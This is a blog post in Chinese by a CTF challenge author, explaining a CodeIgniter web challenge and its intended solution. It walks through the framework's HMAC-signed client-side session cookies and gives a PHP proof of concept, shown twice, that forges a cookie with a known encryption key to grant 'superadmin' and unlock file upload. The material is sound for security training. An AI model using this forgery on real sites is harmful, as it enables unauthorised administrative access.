# CTF-BabyCodeIgniter-Web出题记(1)

  
  
&lt;!--more--&gt;  
## CodeIgniter  
`poc`  
```php  
&lt;?php  
$sessid = &#39;&#39;;  
while (strlen($sessid) &lt; 32)  
{  
    $sessid .= mt_rand(0, mt_getrandmax());  
}  
$encryption_key=&#34;ksd92&#34;;  
$data = array(  
    &#39;username&#39; =&gt; &#39;huahua&#39;,  
    &#39;password&#39; =&gt; &#39;huahua&#39;,  
    &#39;is_logged_in&#39; =&gt; true,  
    &#39;session_id&#39;	=&gt; md5(uniqid($sessid, TRUE)),  
    &#39;ip_address&#39;	=&gt; &#39;127.0.0.1&#39;,  
    &#39;user_agent&#39;	=&gt; &#39;huahua&#39;,  
    &#39;last_activity&#39;	=&gt; time(),  
    &#39;superadmin&#39; =&gt; true  
);  
  
$cookie_data = serialize($data);  
$cookie_data .= hash_hmac(&#39;sha1&#39;,$cookie_data,$encryption_key);  
echo urlencode($cookie_data);  
?&gt;  
```  
### WriteUp  
http://www.mehmetince.net/codeigniter-object-injection-vulnerability-via-encryption-key/  
根据此篇文章改编  
利用弱口令admin/123456登录之后，发现并没有上传权限，探究一下源码中的登录逻辑  
```php  
	function validateuser()  
	{  
		$username=addslashes($this-&gt;input-&gt;post(&#39;username&#39;));  
		$password=addslashes($this-&gt;input-&gt;post(&#39;password&#39;));  
		$query=$this-&gt;db-&gt;query(&#34;SELECT * from user WHERE username=&#39;$username&#39; and password=&#39;$password&#39; limit 1&#34;);  
		  
		if($query-&gt;num_rows() &gt; 0)  
		{			  
			$data = array(  
				&#39;username&#39; =&gt; $username,  
				&#39;password&#39; =&gt; $password,  
				&#39;is_logged_in&#39; =&gt; true,  
				&#39;superadmin&#39; =&gt; false  
			);  
			$this-&gt;session-&gt;set_userdata($data);  
			  
			return 1;					  
		}  
		else  
		{  
			return 0;  
		}		  
	}  
```  
登录成功之后，利用设置了`$this-&gt;session-&gt;set_userdata($data);`  
```php  
$data = array(  
	&#39;username&#39; =&gt; $username,  
	&#39;password&#39; =&gt; $password,  
	&#39;is_logged_in&#39; =&gt; true,  
	&#39;superadmin&#39; =&gt; false  
);  
```  
再来看上传文件的源码  
```php  
	public function upload(){  
		$super = $this-&gt;session-&gt;userdata(&#39;superadmin&#39;);  
		if($super === true){  
			echo &#34;bypass&#34;;  
			if (! $this-&gt;upload-&gt;do_upload(&#39;file&#39;)) {  
				$error = array(&#39;error&#39; =&gt; $this-&gt;upload-&gt;display_errors());  
				var_dump($error);  
			} else {  
				$data = array(&#39;upload_data&#39; =&gt; $this-&gt;upload-&gt;data());  
	  
				var_dump($data);  
			}  
		}else{  
			echo &#34;You are not a super administrator！！！&#34;;  
		}  
	}  
```  
检查了这个地方  
```php  
	$super = $this-&gt;session-&gt;userdata(&#39;superadmin&#39;);  
	if($super === true){  
		...  
	}  
```  
但是在登录成功后，设置的`superadmin`并非`true`而是`false`  
所以并无上传权限，但是登录成功之后，返回给我们了 `cookie`，而非`PHPSESSID`，验证信息存储在了客户端，而非服务端，就导致我们可以篡改。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402042151096.png)
来看一下生成`cookie`的代码逻辑  
在`application/config/autoload.php`中设置了自动加载`session`类  
`$autoload[&#39;libraries&#39;] = array(&#39;database&#39;,&#39;session&#39;,&#39;upload&#39;);`  
于是进入`system/libraries/Session.php`中进行查看，  
首先会进入`__construct()`操作  
```php  
public function __construct($params = array())  
	{  
		log_message(&#39;debug&#39;, &#34;Session Class Initialized&#34;);  
  
		// Set the super object to a local variable for use throughout the class  
		$this-&gt;CI =&amp; get_instance();  
  
		// Set all the session preferences, which can either be set  
		// manually via the $params array above or via the config file  
		foreach (array(&#39;sess_encrypt_cookie&#39;, &#39;sess_use_database&#39;, &#39;sess_table_name&#39;, &#39;sess_expiration&#39;, &#39;sess_expire_on_close&#39;, &#39;sess_match_ip&#39;, &#39;sess_match_useragent&#39;, &#39;sess_cookie_name&#39;, &#39;cookie_path&#39;, &#39;cookie_domain&#39;, &#39;cookie_secure&#39;, &#39;sess_time_to_update&#39;, &#39;time_reference&#39;, &#39;cookie_prefix&#39;, &#39;encryption_key&#39;) as $key)  
		{  
			$this-&gt;$key = (isset($params[$key])) ? $params[$key] : $this-&gt;CI-&gt;config-&gt;item($key);  
		}  
  
		if ($this-&gt;encryption_key == &#39;&#39;)  
		{  
			show_error(&#39;In order to use the Session class you are required to set an encryption key in your config file.&#39;);  
		}  
  
		// Load the string helper so we can use the strip_slashes() function  
		$this-&gt;CI-&gt;load-&gt;helper(&#39;string&#39;);  
  
		// Do we need encryption? If so, load the encryption class  
		if ($this-&gt;sess_encrypt_cookie == TRUE)  
		{  
			$this-&gt;CI-&gt;load-&gt;library(&#39;encrypt&#39;);  
		}  
  
		// Are we using a database?  If so, load it  
		if ($this-&gt;sess_use_database === TRUE AND $this-&gt;sess_table_name != &#39;&#39;)  
		{  
			$this-&gt;CI-&gt;load-&gt;database();  
		}  
  
		// Set the &#34;now&#34; time.  Can either be GMT or server time, based on the  
		// config prefs.  We use this to set the &#34;last activity&#34; time  
		$this-&gt;now = $this-&gt;_get_time();  
  
		// Set the session length. If the session expiration is  
		// set to zero we&#39;ll set the expiration two years from now.  
		if ($this-&gt;sess_expiration == 0)  
		{  
			$this-&gt;sess_expiration = (60*60*24*365*2);  
		}  
  
		// Set the cookie name  
		$this-&gt;sess_cookie_name = $this-&gt;cookie_prefix.$this-&gt;sess_cookie_name;  
  
		// Run the Session routine. If a session doesn&#39;t exist we&#39;ll  
		// create a new one.  If it does, we&#39;ll update it.  
		if ( ! $this-&gt;sess_read())  
		{  
			$this-&gt;sess_create();  
		}  
		else  
		{  
			$this-&gt;sess_update();  
		}  
  
		// Delete &#39;old&#39; flashdata (from last request)  
		$this-&gt;_flashdata_sweep();  
  
		// Mark all new flashdata as old (data will be deleted before next request)  
		$this-&gt;_flashdata_mark();  
  
		// Delete expired sessions if necessary  
		$this-&gt;_sess_gc();  
  
		log_message(&#39;debug&#39;, &#34;Session routines successfully run&#34;);  
	}  
```  
首先会进行读取，如果没有接收到cookie，则会进入`$this-&gt;sess_create();`进行创建  
```php  
	function sess_create()  
	{  
		$sessid = &#39;&#39;;  
		while (strlen($sessid) &lt; 32)  
		{  
			$sessid .= mt_rand(0, mt_getrandmax());  
		}  
  
		// To make the session ID even more secure we&#39;ll combine it with the user&#39;s IP  
		$sessid .= $this-&gt;CI-&gt;input-&gt;ip_address();  
  
		$this-&gt;userdata = array(  
							&#39;session_id&#39;	=&gt; md5(uniqid($sessid, TRUE)),  
							&#39;ip_address&#39;	=&gt; $this-&gt;CI-&gt;input-&gt;ip_address(),  
							&#39;user_agent&#39;	=&gt; substr($this-&gt;CI-&gt;input-&gt;user_agent(), 0, 120),  
							&#39;last_activity&#39;	=&gt; $this-&gt;now,  
							&#39;user_data&#39;		=&gt; &#39;&#39;  
							);  
  
  
		// Save the data to the DB if needed  
		if ($this-&gt;sess_use_database === TRUE)  
		{  
			$this-&gt;CI-&gt;db-&gt;query($this-&gt;CI-&gt;db-&gt;insert_string($this-&gt;sess_table_name, $this-&gt;userdata));  
		}  
  
		// Write the cookie  
		$this-&gt;_set_cookie();  
	}  
```  
会初始化一些值  
```php  
$this-&gt;userdata = array(  
					&#39;session_id&#39;	=&gt; md5(uniqid($sessid, TRUE)),  
					&#39;ip_address&#39;	=&gt; $this-&gt;CI-&gt;input-&gt;ip_address(),  
					&#39;user_agent&#39;	=&gt; substr($this-&gt;CI-&gt;input-&gt;user_agent(), 0, 120),  
					&#39;last_activity&#39;	=&gt; $this-&gt;now,  
					&#39;user_data&#39;		=&gt; &#39;&#39;  
					);  
```  
接着调用了`$this-&gt;_set_cookie();`  
```php  
	function _set_cookie($cookie_data = NULL)  
	{  
		if (is_null($cookie_data))  
		{  
			$cookie_data = $this-&gt;userdata;  
		}  
  
		// Serialize the userdata for the cookie  
		$cookie_data = $this-&gt;_serialize($cookie_data);  
  
		if ($this-&gt;sess_encrypt_cookie == TRUE)  
		{  
			$cookie_data = $this-&gt;CI-&gt;encrypt-&gt;encode($cookie_data);  
		}  
  
		$cookie_data .= hash_hmac(&#39;sha1&#39;, $cookie_data, $this-&gt;encryption_key);  
  
		$expire = ($this-&gt;sess_expire_on_close === TRUE) ? 0 : $this-&gt;sess_expiration &#43; time();  
  
		// Set the cookie  
		setcookie(  
			$this-&gt;sess_cookie_name,  
			$cookie_data,  
			$expire,  
			$this-&gt;cookie_path,  
			$this-&gt;cookie_domain,  
			$this-&gt;cookie_secure  
		);  
```  
序列化传入的数组，接着序列化之后，拼接了一个需要密钥&#34;加密的字符串&#34;，然后利用`setcookie`函数，设置了我们的`cookie`  
```php  
$cookie_data = $this-&gt;_serialize($cookie_data);  
......  
$cookie_data .= hash_hmac(&#39;sha1&#39;, $cookie_data, $this-&gt;encryption_key);  
......  
setcookie(  
	$this-&gt;sess_cookie_name,  
	$cookie_data,  
	$expire,  
	$this-&gt;cookie_path,  
	$this-&gt;cookie_domain,  
	$this-&gt;cookie_secure  
);  
```  
也就是说，我们只需要将登录成功后设置的 cookie `&#39;superadmin&#39; =&gt; false`改为`&#39;superadmin&#39; =&gt; true`即可，上面说到没有 cookie 才会进行创建，有 cookie 则会执行`sess_read()`函数  
```php  
function sess_read()  
	{  
		// Fetch the cookie  
		$session = $this-&gt;CI-&gt;input-&gt;cookie($this-&gt;sess_cookie_name);  
		// No cookie?  Goodbye cruel world!...  
		if ($session === FALSE)  
		{  
			log_message(&#39;debug&#39;, &#39;A session cookie was not found.&#39;);  
			return FALSE;  
		}  
  
		// HMAC authentication  
		$len = strlen($session) - 40;  
  
		if ($len &lt;= 0)  
		{  
			log_message(&#39;error&#39;, &#39;Session: The session cookie was not signed.&#39;);  
			return FALSE;  
		}  
  
		// Check cookie authentication  
		$hmac = substr($session, $len);  
		$session = substr($session, 0, $len);  
  
		// Time-attack-safe comparison  
		$hmac_check = hash_hmac(&#39;sha1&#39;, $session, $this-&gt;encryption_key);  
		$diff = 0;  
  
		for ($i = 0; $i &lt; 40; $i&#43;&#43;)  
		{  
			$xor = ord($hmac[$i]) ^ ord($hmac_check[$i]);  
			$diff |= $xor;  
		}  
  
		if ($diff !== 0)  
		{  
			log_message(&#39;error&#39;, &#39;Session: HMAC mismatch. The session cookie data did not match what was expected.&#39;);  
			$this-&gt;sess_destroy();  
			return FALSE;  
		}  
  
		// Decrypt the cookie data  
		if ($this-&gt;sess_encrypt_cookie == TRUE)  
		{  
			$session = $this-&gt;CI-&gt;encrypt-&gt;decode($session);  
		}  
  
		// Unserialize the session array  
		$session = $this-&gt;_unserialize($session);  
		// Is the session data we unserialized an array with the correct format?  
		if ( ! is_array($session) OR ! isset($session[&#39;session_id&#39;]) OR ! isset($session[&#39;ip_address&#39;]) OR ! isset($session[&#39;user_agent&#39;]) OR ! isset($session[&#39;last_activity&#39;]))  
		{  
			$this-&gt;sess_destroy();  
			return FALSE;  
		}  
  
		// Is the session current?  
		// if (($session[&#39;last_activity&#39;] &#43; $this-&gt;sess_expiration) &lt; $this-&gt;now)  
		// {  
		// 	$this-&gt;sess_destroy();  
		// 	return FALSE;  
		// }  
  
		// // Does the IP Match?  
		// if ($this-&gt;sess_match_ip == TRUE AND $session[&#39;ip_address&#39;] != $this-&gt;CI-&gt;input-&gt;ip_address())  
		// {  
		// 	$this-&gt;sess_destroy();  
		// 	return FALSE;  
		// }  
  
		// // Does the User Agent Match?  
		// if ($this-&gt;sess_match_useragent == TRUE AND trim($session[&#39;user_agent&#39;]) != trim(substr($this-&gt;CI-&gt;input-&gt;user_agent(), 0, 120)))  
		// {  
		// 	$this-&gt;sess_destroy();  
		// 	return FALSE;  
		// }  
  
		// Is there a corresponding session in the DB?  
		if ($this-&gt;sess_use_database === TRUE)  
		{  
			$this-&gt;CI-&gt;db-&gt;where(&#39;session_id&#39;, $session[&#39;session_id&#39;]);  
  
			if ($this-&gt;sess_match_ip == TRUE)  
			{  
				$this-&gt;CI-&gt;db-&gt;where(&#39;ip_address&#39;, $session[&#39;ip_address&#39;]);  
			}  
  
			if ($this-&gt;sess_match_useragent == TRUE)  
			{  
				$this-&gt;CI-&gt;db-&gt;where(&#39;user_agent&#39;, $session[&#39;user_agent&#39;]);  
			}  
  
			$query = $this-&gt;CI-&gt;db-&gt;get($this-&gt;sess_table_name);  
  
			// No result?  Kill it!  
			if ($query-&gt;num_rows() == 0)  
			{  
				$this-&gt;sess_destroy();  
				return FALSE;  
			}  
  
			// Is there custom data?  If so, add it to the main session array  
			$row = $query-&gt;row();  
			if (isset($row-&gt;user_data) AND $row-&gt;user_data != &#39;&#39;)  
			{  
				$custom_data = $this-&gt;_unserialize($row-&gt;user_data);  
  
				if (is_array($custom_data))  
				{  
					foreach ($custom_data as $key =&gt; $val)  
					{  
						$session[$key] = $val;  
					}  
				}  
			}  
		}  
  
		// Session is valid!  
		$this-&gt;userdata = $session;  
		unset($session);  
  
		return TRUE;  
	}  
```  
会利用密钥`$this-&gt;encryption_key`进行一个&#34;加密字符串&#34;的认证，这里的密钥需要在配置文件中`$config[&#39;encryption_key&#39;] = &#39;ksd92&#39;;`  
```php  
		// Check cookie authentication  
		$hmac = substr($session, $len);  
		$session = substr($session, 0, $len);  
  
		// Time-attack-safe comparison  
		$hmac_check = hash_hmac(&#39;sha1&#39;, $session, $this-&gt;encryption_key);  
		$diff = 0;  
  
		for ($i = 0; $i &lt; 40; $i&#43;&#43;)  
		{  
			$xor = ord($hmac[$i]) ^ ord($hmac_check[$i]);  
			$diff |= $xor;  
		}  
```  
接着会反序列化字符串，验证是否有其中的值(session_id、ip_address、last_activity)  
```php  
		// Unserialize the session array  
		$session = $this-&gt;_unserialize($session);  
		// Is the session data we unserialized an array with the correct format?  
		if ( ! is_array($session) OR ! isset($session[&#39;session_id&#39;]) OR ! isset($session[&#39;ip_address&#39;]) OR ! isset($session[&#39;user_agent&#39;]) OR ! isset($session[&#39;last_activity&#39;]))  
		{  
			$this-&gt;sess_destroy();  
			return FALSE;  
		}  
```  
验证完之后将会赋值给`$this-&gt;data`变量  
```php  
// Session is valid!  
$this-&gt;userdata = $session;  
unset($session);  
```  
那赋值给`$this-&gt;userdata`变量有什么用呢？在返回来看验证权限的函数  
`$this-&gt;session-&gt;userdata(&#39;superadmin&#39;);`  
```php  
	function userdata($item)  
	{  
		return ( ! isset($this-&gt;userdata[$item])) ? FALSE : $this-&gt;userdata[$item];  
	}  
```  
正是返回了`$this-&gt;userdata`变量  
于是乎构造`poc`  
```php  
&lt;?php  
$sessid = &#39;&#39;;  
while (strlen($sessid) &lt; 32)  
{  
    $sessid .= mt_rand(0, mt_getrandmax());  
}  
$encryption_key=&#34;ksd92&#34;;  
$data = array(  
    &#39;username&#39; =&gt; &#39;huahua&#39;,  
    &#39;password&#39; =&gt; &#39;huahua&#39;,  
    &#39;is_logged_in&#39; =&gt; true,  
    &#39;session_id&#39;	=&gt; md5(uniqid($sessid, TRUE)),  
    &#39;ip_address&#39;	=&gt; &#39;127.0.0.1&#39;,  
    &#39;user_agent&#39;	=&gt; &#39;huahua&#39;,  
    &#39;last_activity&#39;	=&gt; time(),  
    &#39;superadmin&#39; =&gt; true  
);  
  
$cookie_data = serialize($data);  
$cookie_data .= hash_hmac(&#39;sha1&#39;,$cookie_data,$encryption_key);  
echo urlencode($cookie_data);  
?&gt;  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402042215164.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402042223634.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202402042225193.png)
  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/ctf-babycodeigniter-web%E5%87%BA%E9%A2%98%E8%AE%B01/  

